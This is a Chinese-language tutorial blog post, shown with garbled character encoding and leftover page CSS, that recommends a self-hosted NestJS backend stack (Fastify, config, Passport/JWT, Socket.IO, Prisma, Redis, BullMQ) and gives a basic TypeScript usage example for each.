h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p>æˆ‘æ­£åœ¨å¼€å‘ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxun082%2FDocFlow" target="_blank" title="https://github.com/xun082/DocFlow" ref="nofollow noopener noreferrer">DocFlow</a>ï¼Œå®ƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„ AI å…¨æ ˆååŒæ–‡æ¡£å¹³å°ã€‚è¯¥é¡¹ç›®èåˆäº†å¤šä¸ªæŠ€æœ¯æ ˆï¼ŒåŒ…æ‹¬åŸºäº <code>Tiptap</code> çš„å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ã€<code>NestJs</code> åç«¯æœåŠ¡ã€<code>AI</code> é›†æˆåŠŸèƒ½å’Œå®æ—¶åä½œã€‚åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæˆ‘ç§¯ç´¯äº†ä¸°å¯Œçš„å®æˆ˜ç»éªŒï¼Œæ¶µç›–äº† <code>Tiptap</code> çš„æ·±åº¦å®šåˆ¶ã€æ€§èƒ½ä¼˜åŒ–å’Œåä½œåŠŸèƒ½çš„å®ç°ç­‰æ ¸å¿ƒéš¾ç‚¹ã€‚</p>
</blockquote>
<p>å¦‚æœä½ å¯¹ AI å…¨æ ˆå¼€å‘ã€Tiptap å¯Œæ–‡æœ¬ç¼–è¾‘å™¨å®šåˆ¶æˆ– DocFlow é¡¹ç›®çš„å®Œæ•´æŠ€æœ¯æ–¹æ¡ˆæ„Ÿå…´è¶£ï¼Œæ¬¢è¿åŠ æˆ‘å¾®ä¿¡ <code>yunmz777</code> è¿›è¡Œç§èŠå’¨è¯¢ï¼Œè·å–è¯¦ç»†çš„æŠ€æœ¯åˆ†äº«å’Œæœ€ä½³å®è·µã€‚</p>
<p>å¯¹å¾ˆå¤šæƒ³ä»å‰ç«¯è½¬å‘å…¨æ ˆçš„åŒå­¦æ¥è¯´ï¼Œ<code>NestJS</code> æ˜¯ä¸€ä¸ªéå¸¸å‹å¥½çš„é€‰æ‹©ï¼šè¯­æ³•é£æ ¼æ¥è¿‘å‰ç«¯ç†Ÿæ‚‰çš„ <code>TypeScript</code>ï¼Œåˆå€Ÿé‰´äº†åç«¯å¸¸è§çš„æ¨¡å—åŒ–ä¸ä¾èµ–æ³¨å…¥æ¨¡å¼ï¼Œå¯ä»¥åœ¨ä¿ç•™å‰ç«¯å¼€å‘èˆ’é€‚åº¦çš„åŒæ—¶ï¼Œæ¯”è¾ƒè½»æ¾åœ°æ­èµ·ä¸€å¥—â€œåƒæ ·çš„åç«¯æœåŠ¡â€ã€‚</p>
<p>å¦‚æœç›®æ ‡ä¸ä»…æ˜¯å†™å‡ ä¸ªç®€å•æ¥å£ï¼Œè€Œæ˜¯è¦æ‰›èµ·é‰´æƒã€å®æ—¶ååŒã€AI èƒ½åŠ›ï¼Œè¿˜è¦è‡ªå·±æ­å»ºå’Œç»´æŠ¤æ•°æ®åº“ã€ç¼“å­˜ã€æœç´¢ã€å¯¹è±¡å­˜å‚¨ã€ç›‘æ§è¿™äº›åŸºç¡€è®¾æ–½ï¼Œé‚£ä¹ˆå°±éœ€è¦ä¸€å¥—åâ€œè‡ªæ‰˜ç®¡ã€è‡ªè¿ç»´â€çš„ <code>NestJS</code> æŠ€æœ¯æ ˆç»„åˆã€‚</p>
<p>è¿™é‡Œæ¨èçš„æŠ€æœ¯æ ˆé€‰æ‹©æ ‡å‡†ä¸»è¦æœ‰ä¸‰ç‚¹ï¼š</p>
<ol>
<li>å’Œ <code>NestJS</code> ç”Ÿæ€é«˜åº¦å¥‘åˆï¼Œæœ‰æˆç†Ÿçš„å®˜æ–¹æˆ–ç¤¾åŒºé›†æˆï¼›</li>
<li>èƒ½å¤Ÿæ”¯æ’‘ä¸­å¤§å‹æ–‡æ¡£ã€çŸ¥è¯†ç±»åº”ç”¨çš„æ€§èƒ½å’Œå¤æ‚åº¦ï¼Œæ¯”å¦‚ååŒç¼–è¾‘ã€å…¨æ–‡æ£€ç´¢ã€RAGã€ä»»åŠ¡é˜Ÿåˆ—ç­‰ï¼›</li>
<li>ä¸ªäººæˆ–å°å›¢é˜Ÿä¹Ÿèƒ½åœ¨åˆç†æˆæœ¬å†…è‡ªè¡Œéƒ¨ç½²å’Œç»´æŠ¤ï¼Œæ¯”å¦‚ä½¿ç”¨ <code>Prisma</code> + <code>MySql</code>ã€<code>Redis</code>ã€<code>Elasticsearch</code>ã€<code>MinIO</code> è¿™ç±»å¼€æºç»„ä»¶ã€‚</li>
</ol>
<p>æ¥ä¸‹æ¥å°±æŒ‰ç…§ä»æ¡†æ¶ã€è¿è¡Œæ—¶åˆ°æ•°æ®å±‚ã€æœç´¢ã€é˜Ÿåˆ—ã€AI çš„é¡ºåºï¼Œåˆ†äº«ä¸€å¥—é€‚åˆå‰ç«¯è½¬å…¨æ ˆä½¿ç”¨çš„ <code>NestJS</code> æ ¸å¿ƒæŠ€æœ¯æ ˆï¼Œä»£ç ä¹Ÿå°½é‡è´´è¿‘å®æˆ˜ï¼Œæ–¹ä¾¿ç›´æ¥æ”¹é€ å¤ç”¨ã€‚</p>
<h2 data-id="heading-0"><code>NestJS</code> å’Œ <code>TypeScript</code></h2>
<p><code>NestJS</code> æ˜¯æ•´ä¸ªåç«¯çš„â€œæ¡†æ¶å£³å­â€ï¼Œè´Ÿè´£æ¨¡å—åˆ’åˆ†ã€ä¾èµ–æ³¨å…¥ã€è£…é¥°å™¨ç­‰åŸºç¡€èƒ½åŠ›ï¼›<code>TypeScript</code> åˆ™æ˜¯åœ°åŸºï¼ŒæŠŠå¾ˆå¤šåŸæœ¬è¦é ç»éªŒé¿å…çš„é”™è¯¯æå‰åˆ°ç¼–è¯‘æœŸå‘ç°ï¼Œä¾‹å¦‚ Controller å…¥å‚ã€Service è¿”å›å€¼ã€é…ç½®å¯¹è±¡ç­‰ã€‚</p>
<p>å®é™…é¡¹ç›®ä¸­ï¼Œä¸€èˆ¬ä¼šå¼€å¯ä¸¥æ ¼æ¨¡å¼ï¼Œå†ç»“åˆå…¨å±€çš„ <code>ValidationPipe</code> å’Œ <code>class-transformer</code>ï¼ŒæŠŠè¯·æ±‚é‡Œçš„åŸå§‹ JSON è‡ªåŠ¨è½¬æ¢æˆå¸¦ç±»å‹çš„ DTO å®ä¾‹ï¼Œä»è€Œå‡å°‘ <code>any</code> çš„ä½¿ç”¨ã€é¿å…è„æ•°æ®æµå…¥ä¸šåŠ¡å±‚ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">NestFactory</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/core'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.module'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ValidationPipe</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NestFactory</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">AppModule</span>);
  app.<span class="hljs-title function_">useGlobalPipes</span>(
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ValidationPipe</span>({
      <span class="hljs-attr">whitelist</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">transform</span>: <span class="hljs-literal">true</span>,
    }),
  );
  <span class="hljs-keyword">await</span> app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
}

<span class="hljs-title function_">bootstrap</span>();
</code></pre>
<h2 data-id="heading-1"><code>Fastify</code> å’Œ <code>@nestjs/platform-fastify</code></h2>
<p><code>Fastify</code> æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ HTTP å¼•æ“ï¼Œç›¸æ¯” <code>Express</code> æ›´è½»é‡ã€æ›´é€‚åˆé«˜å¹¶å‘åœºæ™¯ï¼›<code>@nestjs/platform-fastify</code> è´Ÿè´£æŠŠ Fastify æ¥è¿› Nestï¼Œè®©ä½ åœ¨ä¸šåŠ¡å±‚ä¾ç„¶åªå†™æ ‡å‡†çš„ Controllerã€Guardã€Interceptor ç­‰ã€‚</p>
<p>æ­é… <code>@fastify/helmet</code>ã€<code>@fastify/rate-limit</code>ã€<code>@fastify/cookie</code>ã€<code>@fastify/secure-session</code>ã€<code>@fastify/multipart</code>ã€<code>@fastify/static</code>ï¼Œå¯ä»¥åœ¨ç»Ÿä¸€æ¡†æ¶é‡Œå®Œæˆå®‰å…¨å¤´ã€é™æµã€ä¼šè¯ã€ä¸Šä¼ å’Œé™æ€èµ„æºæ‰˜ç®¡ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// main.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">NestFactory</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/core'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AppModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.module'</span>;
<span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">FastifyAdapter</span>,
  <span class="hljs-title class_">NestFastifyApplication</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/platform-fastify'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">bootstrap</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NestFactory</span>.<span class="hljs-property">create</span>&lt;<span class="hljs-title class_">NestFastifyApplication</span>&gt;(
    <span class="hljs-title class_">AppModule</span>,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">FastifyAdapter</span>(),
  );
  <span class="hljs-keyword">await</span> app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-string">'0.0.0.0'</span>);
}

<span class="hljs-title function_">bootstrap</span>();
</code></pre>
<h2 data-id="heading-2"><code>@nestjs/config</code></h2>
<p><code>@nestjs/config</code> æ˜¯ Nest å®˜æ–¹çš„é…ç½®æ¨¡å—ï¼Œç”¨æ¥ç»Ÿä¸€ç®¡ç†å¤šç¯å¢ƒé…ç½®ã€‚æ€è·¯å¾ˆç®€å•ï¼šæ‰€æœ‰æ•°æ®åº“åœ°å€ã€ç¬¬ä¸‰æ–¹ç§˜é’¥ã€å¼€å…³é…ç½®ç­‰ï¼Œéƒ½é€šè¿‡ <code>ConfigService</code> è¯»å–ï¼Œè€Œä¸æ˜¯åœ¨ä»£ç é‡Œåˆ°å¤„æ•£è½ <code>process.env</code>ã€‚</p>
<p>æ¨èçš„åšæ³•æ˜¯ä¸ºä¸åŒé¢†åŸŸå†™ç‹¬ç«‹çš„é…ç½®å·¥å‚ï¼Œç„¶ååœ¨å¯¹åº”æ¨¡å—ä¸­æ³¨å…¥ä½¿ç”¨ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// app.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Module</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ConfigModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/config'</span>;

<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [
    <span class="hljs-title class_">ConfigModule</span>.<span class="hljs-title function_">forRoot</span>({
      <span class="hljs-attr">isGlobal</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">envFilePath</span>: <span class="hljs-string">'.env'</span>,
    }),
  ],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppModule</span> {}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// some.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ConfigService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/config'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SomeService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> configService: ConfigService</span>) {}

  <span class="hljs-title function_">getDbUrl</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">configService</span>.<span class="hljs-property">get</span>&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">'DATABASE_URL'</span>);
  }
}
</code></pre>
<h2 data-id="heading-3"><code>Passport</code> å’Œ <code>JWT</code></h2>
<p><code>@nestjs/passport</code> å’Œ <code>@nestjs/jwt</code> æä¾›äº†ä¸€æ•´å¥—è®¤è¯åŸºç¡€è®¾æ–½ï¼š<code>Passport</code> ç»Ÿä¸€ç®¡ç†å„ç§è®¤è¯ç­–ç•¥ï¼ˆæœ¬åœ°ã€JWTã€OAuth ç­‰ï¼‰ï¼Œ<code>JWT</code> æä¾›æ— çŠ¶æ€ä»¤ç‰Œï¼Œè®©å‰åç«¯åˆ†ç¦»ã€å¤šç«¯è®¿é—®æ›´å®¹æ˜“ç®¡ç†ã€‚</p>
<p>å¸¸è§æµç¨‹æ˜¯ï¼šé€šè¿‡æœ¬åœ°ç­–ç•¥éªŒè¯ç”¨æˆ·åå¯†ç ï¼Œç™»å½•æˆåŠŸåç­¾å‘ <code>JWT</code>ï¼Œåç»­è¯·æ±‚é€šè¿‡ <code>AuthGuard('jwt')</code> éªŒè¯ï¼›æ¥å…¥ç¬¬ä¸‰æ–¹ç™»å½•ï¼ˆå¦‚ GitHubï¼‰æ—¶ï¼Œä»…éœ€å¢åŠ æ–°çš„ Passport ç­–ç•¥ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// auth.module.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Module</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">JwtModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/jwt'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PassportModule</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/passport'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">JwtStrategy</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./jwt.strategy'</span>;

<span class="hljs-meta">@Module</span>({
  <span class="hljs-attr">imports</span>: [
    <span class="hljs-title class_">PassportModule</span>.<span class="hljs-title function_">register</span>({ <span class="hljs-attr">defaultStrategy</span>: <span class="hljs-string">'jwt'</span> }),
    <span class="hljs-title class_">JwtModule</span>.<span class="hljs-title function_">register</span>({
      <span class="hljs-attr">secret</span>: <span class="hljs-string">'secret'</span>, <span class="hljs-comment">// å®é™…é¡¹ç›®è¯·ä» ConfigService è¯»å–</span>
    }),
  ],
  <span class="hljs-attr">providers</span>: [<span class="hljs-title class_">JwtStrategy</span>],
  <span class="hljs-attr">exports</span>: [<span class="hljs-title class_">PassportModule</span>, <span class="hljs-title class_">JwtModule</span>],
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AuthModule</span> {}
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// some.controller.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Controller</span>, <span class="hljs-title class_">Get</span>, <span class="hljs-title class_">UseGuards</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">AuthGuard</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/passport'</span>;

<span class="hljs-meta">@Controller</span>(<span class="hljs-string">'profile'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProfileController</span> {
  <span class="hljs-meta">@UseGuards</span>(<span class="hljs-title class_">AuthGuard</span>(<span class="hljs-string">'jwt'</span>))
  <span class="hljs-meta">@Get</span>()
  <span class="hljs-title function_">getProfile</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">ok</span>: <span class="hljs-literal">true</span> };
  }
}
</code></pre>
<h2 data-id="heading-4"><code>WebSocket</code> å’Œ <code>Socket.IO</code></h2>
<p>å½“ç³»ç»Ÿéœ€è¦å³æ—¶é€šçŸ¥ã€åœ¨çº¿çŠ¶æ€ã€ååŒç¼–è¾‘æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>@nestjs/websockets</code> æ­é… <code>@nestjs/platform-socket.io</code> å’Œ <code>socket.io</code>ã€‚<code>Gateway</code> å……å½“â€œé•¿è¿æ¥å…¥å£â€ï¼Œè´Ÿè´£ç®¡ç†è¿æ¥ã€æˆ¿é—´å’Œäº‹ä»¶ã€‚</p>
<p>æ›´é«˜çº§çš„ååŒåœºæ™¯ä¸­ï¼Œè¿˜å¯ä»¥å¼•å…¥ <code>hocuspocus</code>ã€<code>yjs</code>ã€<code>y-prosemirror</code> æ¥è´Ÿè´£æ–‡æ¡£ååŒç®—æ³•ï¼ŒNest åªéœ€è¦è´Ÿè´£è¿æ¥ç®¡ç†å’Œæƒé™æ ¡éªŒã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// chat.gateway.ts</span>
<span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">WebSocketGateway</span>,
  <span class="hljs-title class_">WebSocketServer</span>,
  <span class="hljs-title class_">SubscribeMessage</span>,
  <span class="hljs-title class_">MessageBody</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/websockets'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Server</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'socket.io'</span>;

<span class="hljs-meta">@WebSocketGateway</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChatGateway</span> {
  <span class="hljs-meta">@WebSocketServer</span>()
  <span class="hljs-attr">server</span>: <span class="hljs-title class_">Server</span>;

  <span class="hljs-meta">@SubscribeMessage</span>(<span class="hljs-string">'message'</span>)
  <span class="hljs-title function_">handleMessage</span>(<span class="hljs-params"><span class="hljs-meta">@MessageBody</span>() data: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">server</span>.<span class="hljs-title function_">emit</span>(<span class="hljs-string">'message'</span>, data);
  }
}
</code></pre>
<h2 data-id="heading-5"><code>Prisma</code></h2>
<p><code>Prisma</code> é€šè¿‡ç‹¬ç«‹çš„ <code>schema.prisma</code> æ–‡ä»¶å®šä¹‰æ¨¡å‹ï¼Œå¹¶ç”Ÿæˆå¼ºç±»å‹çš„ <code>PrismaClient</code>ï¼Œéå¸¸é€‚åˆåœ¨ Nest çš„ Service å±‚ä¸­ä½¿ç”¨ã€‚å®ƒæŠŠæ•°æ®åº“è¿ç§»ã€æ•°æ®å»ºæ¨¡ã€ç±»å‹å®‰å…¨ç»‘åœ¨ä¸€èµ·ï¼Œèƒ½æ˜æ˜¾é™ä½ SQL é”™è¯¯å’Œå­—æ®µæ‹¼å†™é”™è¯¯çš„æ¦‚ç‡ã€‚</p>
<p>åœ¨ Service ä¸­ï¼Œç›´æ¥æ³¨å…¥å°è£…å¥½çš„ <code>PrismaService</code>ï¼Œå°±å¯ä»¥ç”¨ç±»å‹å®‰å…¨çš„æ–¹å¼è¿›è¡Œå¢åˆ æ”¹æŸ¥ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// user.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PrismaService</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/common/prisma/prisma.service'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> prisma: PrismaService</span>) {}

  <span class="hljs-title function_">findAll</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">prisma</span>.<span class="hljs-property">user</span>.<span class="hljs-title function_">findMany</span>();
  }
}
</code></pre>
<h2 data-id="heading-6"><code>Redis</code> å’Œ <code>ioredis</code></h2>
<p><code>Redis</code> æ˜¯å¸¸è§çš„ç¼“å­˜ä¸ä¸­é—´å±‚ï¼Œè€Œ <code>ioredis</code> æ˜¯ç¨³å®šå¥½ç”¨çš„ Node å®¢æˆ·ç«¯ç»„åˆã€‚å®ƒé€šå¸¸ç”¨äºä¸‰ä¸ªæ–¹å‘ï¼šç¼“å­˜ï¼ˆåŠ é€Ÿè¯»å–ï¼‰ã€åˆ†å¸ƒå¼åè°ƒï¼ˆé”ã€é™æµã€é˜²é‡å¤ï¼‰ã€çŸ­æœŸæ•°æ®å­˜å‚¨ï¼ˆä¼šè¯ã€ä»»åŠ¡çŠ¶æ€ç­‰ï¼‰ã€‚</p>
<p>åœ¨ Nest ä¸­ä¸€èˆ¬ä¼šå°è£…ä¸€ä¸ª <code>RedisService</code>ï¼Œå¯¹å¤–æš´éœ² <code>get</code>ã€<code>set</code>ã€<code>incr</code> ç­‰æ–¹æ³•ï¼Œé¿å…ç›´æ¥åœ¨ä¸šåŠ¡é‡Œä½¿ç”¨åº•å±‚å®¢æˆ·ç«¯ã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// redis.service.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Injectable</span>, <span class="hljs-title class_">OnModuleInit</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/common'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Redis</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'ioredis'</span>;

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">OnModuleInit</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">client</span>: <span class="hljs-title class_">Redis</span>;

  <span class="hljs-title function_">onModuleInit</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Redis</span>(<span class="hljs-string">'redis://localhost:6379'</span>);
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">key: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">get</span>(key);
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">set</span>(<span class="hljs-params">key: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span>, ttlSeconds?: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-keyword">if</span> (ttlSeconds) {
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">set</span>(key, value, <span class="hljs-string">'EX'</span>, ttlSeconds);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">set</span>(key, value);
    }
  }
}
</code></pre>
<h2 data-id="heading-7"><code>BullMQ</code></h2>
<p><code>BullMQ</code> æ˜¯åŸºäº <code>Redis</code> çš„ä»»åŠ¡é˜Ÿåˆ—ï¼Œ<code>@nestjs/bullmq</code> è®©ä½ å¯ä»¥ç”¨è£…é¥°å™¨æ–¹å¼å®šä¹‰é˜Ÿåˆ—å’Œæ¶ˆè´¹è€…ã€‚å®ƒé€‚åˆæ‰¿è½½å„ç§è€—æ—¶ä»»åŠ¡ï¼Œä¾‹å¦‚å¤§æ–‡ä»¶è§£æã€æ‰¹é‡å¯¼å…¥å¯¼å‡ºã€è°ƒç”¨å¤–éƒ¨ AI æ¥å£ç­‰ã€‚</p>
<p>è¿™æ ·å¯ä»¥æŠŠé‡ä»»åŠ¡ä» HTTP è¯·æ±‚ä¸­å‰¥ç¦»ï¼Œé¿å…æ¥å£è¶…æ—¶ï¼Œç”¨æˆ·åªéœ€æ‹¿åˆ°ä¸€ä¸ªâ€œä»»åŠ¡å·²å—ç†â€çš„ IDã€‚</p>
<p>åŸºæœ¬ä½¿ç”¨æ¡ˆä¾‹ï¼š</p>
<p>æ¶ˆè´¹è€…ï¼ˆå¤„ç†ä»»åŠ¡ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// task.processor.ts</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Processor</span>, <span class="hljs-title class_">WorkerHost</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nestjs/bullmq'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Job</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'bullmq'</span>;

<span class="hljs-meta">@Processor</span>(<span class="hljs-string">'tasks'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">WorkerHost</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">job: Job</span>) {
    <span class="hljs-comment">// è¿™é‡Œå¤„ç†è€—æ—¶ä»»åŠ¡</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'processing job'</span>, job.<span class="hljs-property">id</span>, job.<span class="hljs-property">data</span>);
  }
}
</code></pre>
